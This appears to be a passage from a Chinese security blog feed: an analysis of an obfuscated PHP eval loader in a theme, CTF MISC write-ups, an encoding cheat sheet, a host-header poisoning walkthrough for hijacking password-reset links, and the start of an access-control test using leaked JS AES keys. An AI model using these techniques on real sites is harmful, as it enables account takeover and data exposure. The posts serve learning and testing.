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\&quot;;eval(&#x27;?&gt;&#x27;.<span class="hljs-subst">$NxJrjR</span>(<span class="hljs-subst">$jIEQJn</span>(<span class="hljs-subst">$fNiCxT</span>(<span class="hljs-subst">$leuBaN</span>,<span class="hljs-subst">$vGTrfG</span>*2),<span class="hljs-subst">$fNiCxT</span>(<span class="hljs-subst">$leuBaN</span>,<span class="hljs-subst">$vGTrfG</span>,<span class="hljs-subst">$vGTrfG</span>),<span class="hljs-subst">$fNiCxT</span>(<span class="hljs-subst">$leuBaN</span>,0,<span class="hljs-subst">$vGTrfG</span>))));\&quot;);?&gt;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>从这里就能看出个大概，代码结构就是上面<code>base64_decode(strtr(substr($VkBFwi,52*2),substr($VkBFwi,52,52),substr($VkBFwi,0,52)));</code>加密的套娃，直接用上面的解密代码一路把不能b64解密的密文解出来。最后解出来发现确实是主题模版文件。</p><p><img src="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20211214215536531.png" alt></p><h2 id="0x03-后记">0x03 后记</h2><p>经过分析，这个可疑函数没有进行类似getshell的操作，但是主题配置功能使用了危险函数<code>eval</code>，并且执行了服务器上的<code>setting.php</code>的内容。虽然这里的<code>setting.php</code>里是正常功能，但是这个文件一旦被换成恶意代码的话，就会造成getshell的效果。菜刀是把好刀，就是因为它既能做饭也能用来杀人。这里我更倾向于作者的安全编码的意识不高，使用了比较危险的函数。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界MISC部分Writeup</title>
    <link href="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/"/>
    <url>/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-base64÷4">0x01 base64÷4</h2><p>64÷4=16，也就是使用base12算法解题。</p><p>已知密文：<code>666C61677B45333342374644384133423834314341393639394544444241323442363041417D</code></p><p>随便找一个b12解密网站，可以得到flag：</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211110102307656.png" alt></p><h2 id="0x02-embarrass">0x02 embarrass</h2><p>下载后是一个数据包，先打开协议统计简单分析一下：</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112155924169.png" alt></p><p>发现含有大部分FTP流量和少量的http流量，目测应该是从ftp里提取数据。</p><p>这里追踪FTP的TCP流，等加载结束后直接在ftp流量里搜索flag。</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112155906694.png" alt></p><h2 id="0x03-神奇的modbus">0x03 神奇的modbus</h2><p>直接wireshark追踪modbus的tcp流，可以看到flag：</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112160528824.png" alt></p><h2 id="0x04-something-in-image">0x04 something_in_image</h2><p>水题，直接notepad++打开搜索flag即可。</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112160655097.png" alt></p><h2 id="0x05-wireshark-1">0x05 wireshark-1</h2><p>导出http流量文件，发现</p><p><code>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG</code></p><p>根据题目描述：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)</p><p>flag即flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><h2 id="0x06-pure-color">0x06 pure_color</h2><p>直接上StegSolve：</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112162909238.png" alt></p><h2 id="0x07-Aesop-secret">0x07 Aesop_secret</h2><p>文件是一个gif文件，放到ps里组合图层发现字符ISCC：</p><p><img src="/2021/11/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%83%A8%E5%88%86Writeup/image-20211112164005950.png" alt></p><p>之后用notepad++打开图片，发现文件尾有疑似密文：</p><p><code>U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==</code></p><p>带斜杠和等号，怀疑是AES加密，密钥是ISCC，放进网站解密得到：</p><p><code>U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ==</code></p><p>先尝试base64解密，发现没法解；再次用AES解密后得到flag：</p><p><code>flag&#123;DugUpADiamondADeepDarkMine&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Misc杂项笔记</title>
    <link href="/2021/11/08/Misc%E6%9D%82%E9%A1%B9%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/11/08/Misc%E6%9D%82%E9%A1%B9%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="通用思路">通用思路</h2><ul><li>拿到文件后首先用foremost或者binwalk检测，看看文件里是否有可提取的隐藏信息</li><li>水题通杀办法：<code>strings file</code>或者<code>cat file | grep flag </code>直接查找flag</li></ul><h2 id="PDF">PDF</h2><ul><li>只有图片，考虑文字是否在图片下方（pdf转word，或者全选复制粘贴都可以发现文字）</li></ul><h2 id="图片类">图片类</h2><ul><li>GIF文件放入PS中，拆解每个文件</li><li>一般用帧查看工具（stegsolve），也不要忘了exif信息</li><li>图像得到的密钥大小写多尝试几次（1588\iscc\ISCC\1500）</li><li>BMP、PNG图片优先用zsteg检测</li><li>多个图片文件可以尝试使用stegsolve工具的拼接功能</li><li>通过010edit更改图片高度来查看是否有隐藏信息</li></ul><h2 id="游戏类">游戏类</h2><ul><li>优先考虑CE内存搜索字符串，其次考虑反编译</li></ul><h2 id="流量分析">流量分析</h2><ul><li><code>foremost + 文件 -o a</code>提取pcap包里的文件</li><li>先利用wireshark的统计分析工具来分析协议，之后再进一步判断flag可能存在于哪种协议的报文里</li><li>报文较少，且报文的内容都正常时，端口号、IP地址、时间戳都有可能是隐藏信息（01转十进制再转ascii码）</li></ul><h2 id="文件头速查">文件头速查</h2><table><thead><tr><th style="text-align:center">文件类型</th><th style="text-align:center">文件头</th><th style="text-align:center">文件尾</th></tr></thead><tbody><tr><td style="text-align:center"><strong>JPEG</strong></td><td style="text-align:center"><strong>FF D8 FF</strong></td><td style="text-align:center"><strong>FF D9</strong></td></tr><tr><td style="text-align:center"><strong>PNG</strong></td><td style="text-align:center"><strong>89 50 4E 47</strong></td><td style="text-align:center"><strong>AE 42 60 82</strong></td></tr><tr><td style="text-align:center"><strong>GIF</strong></td><td style="text-align:center"><strong>47 49 46 38</strong></td><td style="text-align:center"><strong>00 3B</strong></td></tr><tr><td style="text-align:center">TIFF(tif)</td><td style="text-align:center">49 49 2A 00</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">BMP</td><td style="text-align:center">42 4D</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">PSD</td><td style="text-align:center">38 42 50 53</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">RTF</td><td style="text-align:center">7B 5C 72 74 66</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">CAD</td><td style="text-align:center">41 43 31 30</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">XML</td><td style="text-align:center">3C 3F 78 6D 6C</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">HTML</td><td style="text-align:center">68 74 6D 6C 3E</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">EML(email)</td><td style="text-align:center">44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">DBX(outlook)</td><td style="text-align:center">CF AD 12 FE C5 FD 74 6F</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">PST(outlook)</td><td style="text-align:center">21 42 44 4E</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">XLS / DOC</td><td style="text-align:center">D0 CF 11 E0</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">MDB</td><td style="text-align:center">53 74 61 6E 64 61 72 64 20 4A</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><strong>ZIP</strong></td><td style="text-align:center"><strong>50 4B 03 04</strong></td><td style="text-align:center"><strong>50 4B</strong></td></tr><tr><td style="text-align:center"><strong>RAR</strong></td><td style="text-align:center"><strong>52 61 72 21</strong></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><strong>PDF</strong></td><td style="text-align:center"><strong>25 50 44 46 2D 31 2E</strong></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">WAV</td><td style="text-align:center">57 41 56 45</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">AVI</td><td style="text-align:center">41 56 49 20</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">MPG</td><td style="text-align:center">00 00 01 BA / 00 00 01 B3</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">MID</td><td style="text-align:center">4D 54 68 64</td><td style="text-align:center"></td></tr></tbody></table><h2 id="密文特征">密文特征</h2><h3 id="编码类">编码类</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">密文</th><th style="text-align:center">明文</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">Base64</td><td style="text-align:center">ZmxhZ3t0M3N0X2Ywcl90aDFzX000dGNofQ==</td><td style="text-align:center">flag{t3st_f0r_th1s_M4tch}</td><td style="text-align:center">空格被加密为等号，长度不确定，英文字母和数字大小写均有</td></tr><tr><td style="text-align:center">Base16</td><td style="text-align:center">666C61677B6D795F6E616D655F482121487D</td><td style="text-align:center">flag{my_name_H!!H}</td><td style="text-align:center">只由数字和大小写组成</td></tr><tr><td style="text-align:center">base58</td><td style="text-align:center">xpoetRPM7vtSVDSRGRp4nXv</td><td style="text-align:center">flag{hello-world}</td><td style="text-align:center">相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+“和”/&quot;符号</td></tr><tr><td style="text-align:center">HTML编码</td><td style="text-align:center">%E8%BF%99%E6%98%AF%E6%98%8E%E6%96%87</td><td style="text-align:center">这是明文</td><td style="text-align:center">%号+十六进制</td></tr><tr><td style="text-align:center">Unicode</td><td style="text-align:center">\u0074\u0065\u0073\u0074</td><td style="text-align:center">test</td><td style="text-align:center">每一字符都用一个5位字符编码表示，并用\分割</td></tr><tr><td style="text-align:center">OOK</td><td style="text-align:center">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.……</td><td style="text-align:center">flag{ok-ctf-1234-admin}</td><td style="text-align:center">只含有OOK和.</td></tr><tr><td style="text-align:center">OOK变形</td><td style="text-align:center">… … … … !!!. ?.. … … … .?.?! .?.. .!.. … !.?.. … !!!. !!! !!?.? !.?!! !!!.. … … .!.?.. …!? !!.?. … …?.? !.?.. … .!.?. … … !!!. !!! !?.?! .?!.? … …! ?!!.? … …?. ?!.?. …</td><td style="text-align:center">flag{bugku_jiami}</td><td style="text-align:center">只含有!?和.</td></tr><tr><td style="text-align:center">Brainfuck</td><td style="text-align:center">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++…+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</td><td style="text-align:center">Hello World!</td><td style="text-align:center">只含有+ &gt;  &lt; . ] [ -，8种符号</td></tr><tr><td style="text-align:center">rot13</td><td style="text-align:center">Ubj pna lbh gryy na rkgebireg sebz na vagebireg ng AFN? In the elevators, the extrovert looks at the OTHER guy’s shoes.</td><td style="text-align:center">How can you tell an extrovert from an introvert at NSA? Va gur ryringbef, gur rkgebireg ybbxf ng gur BGURE thl’f fubrf.</td><td style="text-align:center">数字不改变，英文取逆反。解密密文只需要对密文再进行一次rot13加密即可</td></tr><tr><td style="text-align:center">JSfuck</td><td style="text-align:center">(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+</td><td style="text-align:center">flag{hhaj}</td><td style="text-align:center">F12控制台直接复制密文进去即可得到输出</td></tr><tr><td style="text-align:center">核心价值观</td><td style="text-align:center">公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治</td><td style="text-align:center">flag{90025f7fb1959936}</td><td style="text-align:center">由核心价值观的12个词语组成的编码方式</td></tr><tr><td style="text-align:center">当铺编码</td><td style="text-align:center">羊由大井夫大人王中工</td><td style="text-align:center">9158753624</td><td style="text-align:center">当前汉字有多少笔画出头，就是转化成数字几</td></tr><tr><td style="text-align:center">词频分析</td><td style="text-align:center">Eg qnlyjtcnzydl z umaujejmjetg qeydsn eu z bsjdtx tw sgqtxegc al kdeqd mgeju tw yrzegjsoj zns nsyrzqsx kejd qeydsnjsoj Ew ltm fgtk jds kzl tw sgqtxegc m kerr csj jds wrzc kdeqd eu qrzuueqzr-qeydsn_eu_gtj_usqmnejl_du</td><td style="text-align:center">In cryptography a substitution cipher is a ?ethod of encoding by which units of plaintext are replaced with ciphertext If you know the way of encoding u will get the flag which is classical-cipher_is_not_security_hs</td><td style="text-align:center">出现次数频率最高的字母为e，最少的字母为z</td></tr><tr><td style="text-align:center">HTML实体编码</td><td style="text-align:center">&amp;#x66 ; &amp;#x6C ; &amp;#x61 ; &amp;#x67</td><td style="text-align:center">flag</td><td style="text-align:center">通常为&amp;#+十六进制组成，密文与分号之间无空格</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h3 id="古典密码">古典密码</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">密文</th><th style="text-align:center">明文</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">栅栏密码</td><td style="text-align:center">fg2ivyo}l{2s3_o@aw__rcl@</td><td style="text-align:center">flag{w22_is_v3ry_cool}</td><td style="text-align:center">组成栅栏的字母一般不会太多，用一定的规则把原文打乱然后用@连接</td></tr><tr><td style="text-align:center">凯撒密码</td><td style="text-align:center">DEFGHIJKLMNOPQRSTUVWXYZABC</td><td style="text-align:center">ABCDEFGHIJKLMNOPQRSTUVWXYZ</td><td style="text-align:center">在原来字符上进行一定的偏移</td></tr><tr><td style="text-align:center">维尼吉亚密码</td><td style="text-align:center">iqdl_lx_qtw_mhwh</td><td style="text-align:center">flag_is_not_here</td><td style="text-align:center">维吉尼亚密码必须有一个密钥，密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h3 id="哈希散列-对称加密">哈希散列 / 对称加密</h3><table><thead><tr><th>名称</th><th>密文</th><th>明文</th><th>备注</th></tr></thead><tbody><tr><td>MD5</td><td>eddf10a31864059279db6a7ff97dcc8e</td><td>flag{t3st_f0r_th1s_M4tch}</td><td>一般为32位，也有16位。通常由数字和A-F的字母组成</td></tr><tr><td>SHA-1</td><td>7c2380341e0f03f81f873ab8d2ea5b88bc690793</td><td>flag{hello_world!}</td><td>一般为40位，由数字和小写字母组成</td></tr><tr><td>DES</td><td>U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c=</td><td>ctf{67a166801342415a6da8f0dbac591974}</td><td>密钥6XaMMbM7</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一次host头中毒导致的逻辑漏洞</title>
    <link href="/2021/09/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1host%E5%A4%B4%E4%B8%AD%E6%AF%92%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/09/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1host%E5%A4%B4%E4%B8%AD%E6%AF%92%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言">0x01 前言</h2><p>暑假的时候翻某安全公众号时发现的一个骚思路。有些网站开发者会提取request包里的host头来获取域名信息，但是host头可以被修改，是不可信的。于是攻击者可以通过构造host头来进行投毒攻击。</p><p>例如发送包含受害者网站域名链接的功能，像是密码找回、发送验证链接等，只要业务上利用了类似于域名提取的功能，都可以尝试利用该攻击方法。这里以密码找回为例，进行一次host头投毒攻击。</p><h2 id="0x02-示例">0x02 示例</h2><p>某网站存在密码找回功能，本例使用host头中毒来实现任意用户密码重置。打开密码找回界面，填写受害用户的邮箱，在最后的提交按钮用burpsuite截断，把host头更改成自己的服务器IP：</p><p><img src="/2021/09/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1host%E5%A4%B4%E4%B8%AD%E6%AF%92%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20210913100457170.png" alt></p><p>之后放行数据包，会提示找回密码邮件发送成功的信息，此时受害者邮箱会收到一封邮件：</p><p><img src="/2021/09/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1host%E5%A4%B4%E4%B8%AD%E6%AF%92%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20210913100700777.png" alt></p><p>可以看到，域名已经改成了我们在host头填写的服务器地址。这时受害者如果访问该链接，则会在我们的服务器上留下一条记录：</p><p><img src="/2021/09/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1host%E5%A4%B4%E4%B8%AD%E6%AF%92%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20210913100828188.png" alt></p><p>在把原域名和日志抓取到的url拼接一下，就能得到受害人的密码重置链接了。</p><h2 id="0x03-后记">0x03 后记</h2><p>这个漏洞是1click的任意密码重置漏洞，利用了host头中毒的思路，我个人感觉还是比较新颖的。不过像大厂安防策略都会对request头数据进行检验，遇到不在白名单的域名直接会拒绝访问。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次前端JS加密泄漏导致的越权测试</title>
    <link href="/2021/07/22/%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95/"/>
    <url>/2021/07/22/%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景">0x00 背景</h2><p>测试过程中碰到了一个会话系统，出于保密原则这里没有截图，自己想象一哈。</p><h2 id="0x01-业务逻辑">0x01 业务逻辑</h2><p>系统功能很简单，就是实现用户A和用户B进行会话，并且可以查看以往的聊天记录。出现漏洞的点也是在历史记录上，通过构造参数可以查看网站内任意用户的聊天记录。</p><p>首先，用户发起查询历史记录的请求时，会发送如下的数据包，并且得到响应：</p><p><img src="/2021/07/22/%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95/image-20210722132703464.png" alt></p><p>可以看到服务器返回了cid，也就是当前发送数据包的uid用户发起过的会话名称，一共有三条。</p><p>再之后，服务器紧接着发送了第二个数据包：</p><p><img src="/2021/07/22/%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95/image-20210722134425476.png" alt></p><p>可以看到响应包就是要查询的会话记录。业务逻辑到此执行结束。</p><h2 id="0x02-测试">0x02 测试</h2><p>不难想出，可以通过更改uid的方式来查看别人的聊天记录。但我实际测试后发现，在第一个数据包如果更改为别人的uid，是可以返回别人的会话名称的。但到了第二个数据包，发送的uid参数经过了加密，最后结果类似于以下字符串：</p><p><code>zrApelW+58GcN+At5Ons+8EysUAU77xqxj9ko3m7XMo=</code></p><p>大致猜个base64，解出来发现乱码，应该是加密后的base64。</p><p>通过F12查看业务运行请求了哪些文件，最后在一个js文件里发现了AES加密的信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">t</span>(<span class="hljs-params">e</span>) &#123;<br>        <span class="hljs-keyword">var</span> t = v.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;bPsoyIvIALTcy6OP&quot;</span>),<br>        i = v.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(e),<br>        a = v.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;W8m2J1I3pQUADWyA8s&quot;</span>),<br>        s = v.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(i, t, &#123;<br>          <span class="hljs-attr">iv</span>: a,<br>          <span class="hljs-attr">mode</span>: v.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,<br>          <span class="hljs-attr">padding</span>: v.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span><br>        &#125;);<br>        <span class="hljs-keyword">return</span> s.<span class="hljs-title function_">toString</span>()<br>      